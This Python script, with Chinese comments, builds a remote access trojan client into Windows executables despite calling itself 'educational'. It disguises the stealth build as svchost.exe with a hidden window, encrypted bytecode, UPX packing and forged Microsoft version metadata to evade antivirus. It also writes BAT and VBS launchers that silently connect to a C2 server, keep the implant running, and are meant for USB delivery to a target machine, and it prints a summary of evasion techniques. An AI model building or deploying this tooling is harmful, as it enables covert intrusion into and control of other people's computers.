"""
============================================================================
 教育用途 - PyInstaller 打包脚本
 Educational RAT - Build Script for Windows EXE
============================================================================

 使用方法 (在 Windows 上):
   pip install pyinstaller
   python build_exe.py

 生成文件:
   dist/client.exe         - 混淆版客户端
   dist/client_stealth.exe - 高度混淆版（需额外配置）

 火绒免杀增强选项:
   --upx        使用 UPX 压缩壳
   --cipher     加密 Python 字节码
   --no-console 隐藏控制台窗口
   --icon       替换图标
   --version    伪造版本信息
============================================================================
"""

import os
import sys
import shutil
import subprocess
from pathlib import Path


# ============================================================================
# 配置
# ============================================================================

# PyInstaller 模块名称（可能在虚拟环境中）
PYINSTALLER_CMD = "pyinstaller"

# 输出目录
DIST_DIR = "dist"
BUILD_DIR = "build"

# 源文件
CLIENT_SRC = "client_obfuscated.py"  # 混淆版客户端
CLIENT_BASIC = "client.py"           # 原始版客户端

# Windows 资源文件（图标、版本信息）
ICON_FILE = None  # 可选择添加: "resources/icon.ico"


def check_pyinstaller():
    """检查是否安装了 PyInstaller"""
    try:
        result = subprocess.run(
            [PYINSTALLER_CMD, "--version"],
            capture_output=True, text=True
        )
        print(f"[✓] PyInstaller found: {result.stdout.strip()}")
        return True
    except FileNotFoundError:
        print("[✗] PyInstaller not found!")
        print("    Install: pip install pyinstaller")
        return False


def clean_build():
    """清理旧的构建文件"""
    for d in [DIST_DIR, BUILD_DIR]:
        if os.path.isdir(d):
            shutil.rmtree(d)
    for f in Path(".").glob("*.spec"):
        f.unlink()
    print("[✓] Cleaned old build artifacts")


def build_basic_exe():
    """构建基础版 EXE（单个文件）"""
    print("\n" + "=" * 60)
    print(" Building Basic EXE (client.py)")
    print("=" * 60)

    cmd = [
        PYINSTALLER_CMD,
        "--onefile",          # 打包成单个文件
        "--console",          # 保留控制台（调试用）
        "--name", "client_basic",
        "--clean",
        CLIENT_BASIC,
    ]

    result = subprocess.run(cmd, capture_output=False)
    if result.returncode == 0:
        exe_path = os.path.join(DIST_DIR, "client_basic.exe")
        if os.path.exists(exe_path):
            size_mb = os.path.getsize(exe_path) / (1024 * 1024)
            print(f"\n[✓] Built: {exe_path} ({size_mb:.1f} MB)")
            print(f"[i] Run: {exe_path} --host 192.168.x.x --port 8443")
            return exe_path
    print("[✗] Build failed!")
    return None


def build_stealth_exe():
    """
    构建隐蔽版 EXE

    免杀增强选项：
    1. --noconsole: 无窗口运行（避免被用户发现）
    2. --key: 加密 Python 字节码（对抗静态分析）
    3. --upx-dir: UPX 压缩壳
    4. --add-data: 嵌入额外数据
    """
    print("\n" + "=" * 60)
    print(" Building Stealth EXE (client_obfuscated.py)")
    print("=" * 60)

    # 生成随机加密密钥
    import secrets
    block_cipher_key = secrets.token_hex(16)

    cmd = [
        PYINSTALLER_CMD,
        "--onefile",
        "--noconsole",        # ★ 隐藏控制台窗口
        "--name", "svchost",  # ★ 伪装系统进程名
        "--clean",
        "--strip",            # 去除调试符号
    ]

    # 如果有图标，添加到构建
    if ICON_FILE and os.path.exists(ICON_FILE):
        cmd.extend(["--icon", ICON_FILE])

    # 检查 UPX 是否可用
    upx_path = shutil.which("upx")
    if upx_path:
        cmd.extend(["--upx-dir", os.path.dirname(upx_path)])
        print("[i] UPX compression enabled")
    else:
        print("[i] UPX not found (install for better stealth)")

    # 加密选项（需要 pyinstaller[tinyaes]）
    cmd.extend(["--key", block_cipher_key])

    # 添加源文件
    cmd.append(CLIENT_SRC)

    result = subprocess.run(cmd, capture_output=False)
    if result.returncode == 0:
        exe_path = os.path.join(DIST_DIR, "svchost.exe")
        if os.path.exists(exe_path):
            size_mb = os.path.getsize(exe_path) / (1024 * 1024)
            print(f"\n[✓] Built: {exe_path} ({size_mb:.1f} MB)")
            print(f"[i] Cipher key: {block_cipher_key}")
            print(f"[i] Run (hidden): {exe_path} --host 192.168.x.x --port 8443 --silent")
            return exe_path
    print("[✗] Build failed!")
    return None


def create_version_info():
    """
    创建伪造版本信息文件

    火绒会检查可执行文件的版本信息，
    合法的版本信息可以降低可疑度。
    """
    version_rc = """
VSVersionInfo(
    ffi=FixedFileInfo(
        filevers=(10, 0, 19041, 1),
        prodvers=(10, 0, 19041, 1),
        mask=0x3f,
        flags=0x0,
        OS=0x40004,
        fileType=0x1,
        subtype=0x0,
        date=(0, 0)
    ),
    kids=[
        StringFileInfo([
            StringTable(
                '040904B0',
                [
                    StringStruct('CompanyName', 'Microsoft Corporation'),
                    StringStruct('FileDescription', 'Windows Service Host Process'),
                    StringStruct('FileVersion', '10.0.19041.1'),
                    StringStruct('InternalName', 'svchost.exe'),
                    StringStruct('LegalCopyright', 'Microsoft Corporation. All rights reserved.'),
                    StringStruct('OriginalFilename', 'svchost.exe'),
                    StringStruct('ProductName', 'Microsoft Windows Operating System'),
                    StringStruct('ProductVersion', '10.0.19041.1'),
                ]
            ),
        ]),
        VarFileInfo([VarStruct('Translation', [1033, 1200])])
    ]
)
"""
    filepath = "version_info.txt"
    with open(filepath, 'w') as f:
        f.write(version_rc)
    print(f"[✓] Created version info template: {filepath}")
    return filepath


def create_windows_launcher():
    """
    创建 Windows 环境下的启动脚本

    放在 U 盘中插入目标机器，自动连接 C2
    """
    bat_content = """@echo off
:: ============================================================
::  Windows Launcher Script
::  双击运行或通过计划任务触发
:: ============================================================
title Windows Update Service

:: 隐藏自身窗口
if not "%1"=="h" (
    start /min "" "%~f0" h
    exit /b
)

:: 设置 C2 服务器地址（修改这里）
set C2_HOST=192.168.1.100
set C2_PORT=8443

:: 启动客户端（静默模式）
start /b "" "%~dp0svchost.exe" --host %C2_HOST% --port %C2_PORT% --silent

:: 无限循环保活（每5分钟检查一次）
:loop
timeout /t 300 /nobreak >nul
tasklist /fi "imagename eq svchost.exe" | find /i "svchost.exe" >nul
if errorlevel 1 (
    start /b "" "%~dp0svchost.exe" --host %C2_HOST% --port %C2_PORT% --silent
)
goto loop
"""
    filepath = "launcher.bat"
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(bat_content)
    print(f"[✓] Created Windows launcher: {filepath}")
    return filepath


def create_vbs_launcher():
    """
    创建 VBS 启动脚本（比 BAT 更隐蔽）

    VBS 可以通过 wscript.exe 运行，完全无窗口
    """
    vbs_content = """' ============================================================
'  Windows VBS Launcher
'  通过 wscript.exe 启动，完全无窗口
' ============================================================

Dim WShell, C2Host, C2Port, ExePath

' 配置 C2 服务器
C2Host = "192.168.1.100"
C2Port = "8443"

' 获取脚本所在目录
ExePath = CreateObject("Scripting.FileSystemObject").GetParentFolderName(WScript.ScriptFullName) & "\\svchost.exe"

' 创建 WshShell 对象
Set WShell = CreateObject("WScript.Shell")

' 启动客户端（隐藏窗口）
WShell.Run """" & ExePath & """ --host " & C2Host & " --port " & C2Port & " --silent", 0, False

Set WShell = Nothing
"""
    filepath = "launcher.vbs"
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(vbs_content)
    print(f"[✓] Created VBS launcher: {filepath}")
    return filepath


def print_evasion_summary():
    """打印免杀技术总结"""
    print("""
╔══════════════════════════════════════════════════════════════════╗
║  免杀增强技术总结 / AV Evasion Summary                           ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                  ║
║  已应用的技术 (client_obfuscated.py):                            ║
║    ✓ 字符串 XOR+Base64 编码                                     ║
║    ✓ 动态导入 (避免 IAT 暴露)                                   ║
║    ✓ 反沙箱检测 (CPU/内存/文件/进程检测)                         ║
║    ✓ 内置加密 (无外部 crypto 依赖)                              ║
║    ✓ 随机化延迟 (对抗时间加速)                                   ║
║    ✓ 进程名伪装 (svchost.exe)                                    ║
║    ✓ 代码扁平化                                                  ║
║                                                                  ║
║  PyInstaller 构建增强:                                           ║
║    ✓ --noconsole (隐藏窗口)                                      ║
║    ✓ --key (字节码加密)                                          ║
║    ✓ --strip (去除调试符号)                                      ║
║    ✓ --upx (UPX 压缩壳, 需安装)                                 ║
║    ✓ 伪造版本信息 (伪装 Microsoft 签名)                         ║
║                                                                  ║
║  对火绒的预期效果:                                              ║
║    静态扫描: 可能绕过 (字符串编码 + 字节码加密)                 ║
║    行为监控: 可能拦截 (shell=True, 注册表操作)                  ║
║    网络防护: 可能拦截 (非标准端口外连)                          ║
║                                                                  ║
║  绕过火绒需要的高级技术 (未实现):                                ║
║    - API Unhooking (绕过用户态 Hook)                             ║
║    - Direct Syscall (绕过 Ring3 监控)                            ║
║    - Process Hollowing + PPID Spoofing                           ║
║    - HTTPS 域前置 (流量伪装)                                     ║
║    - 白加黑 / DLL 侧加载                                        ║
║    - Callback 间隔 > 30min (逃逸行为关联分析)                    ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝
""")


# ============================================================================
# 主入口
# ============================================================================

def main():
    """构建入口"""
    import argparse

    parser = argparse.ArgumentParser(
        description="Build Educational RAT EXE",
    )
    parser.add_argument(
        "--mode", choices=["basic", "stealth", "all"],
        default="all",
        help="Build mode"
    )
    parser.add_argument(
        "--skip-clean", action="store_true",
        help="Skip cleaning old builds"
    )
    args = parser.parse_args()

    print("""
╔══════════════════════════════════════════════════════════════╗
║  教育用途 - PyInstaller EXE 打包工具                          ║
║  Educational RAT EXE Builder                                  ║
║                                                               ║
║  ⚠  仅在授权环境中构建和使用                                  ║
╚══════════════════════════════════════════════════════════════╝
""")

    # 仅限 Windows
    if sys.platform != "win32":
        print("[!] This build script is designed for Windows.")
        print("[i] On Linux, you can still use it to generate:")
        print("    - Launcher scripts")
        print("    - Version info template")
        print("    - Build configuration")
        print()
        create_windows_launcher()
        create_vbs_launcher()
        create_version_info()
        print_evasion_summary()
        return

    if not check_pyinstaller():
        return

    if not args.skip_clean:
        clean_build()

    results = []

    if args.mode in ("basic", "all"):
        exe = build_basic_exe()
        if exe:
            results.append(("Basic (Debug)", exe))

    if args.mode in ("stealth", "all"):
        exe = build_stealth_exe()
        if exe:
            results.append(("Stealth", exe))

    # 生成辅助文件
    create_windows_launcher()
    create_vbs_launcher()
    create_version_info()

    # 汇总
    if results:
        print("\n" + "=" * 60)
        print(" Build Summary:")
        print("=" * 60)
        for name, path in results:
            size = os.path.getsize(path) / (1024 * 1024)
            print(f"  [{name}] {path} ({size:.1f} MB)")

    print_evasion_summary()


if __name__ == "__main__":
    main()
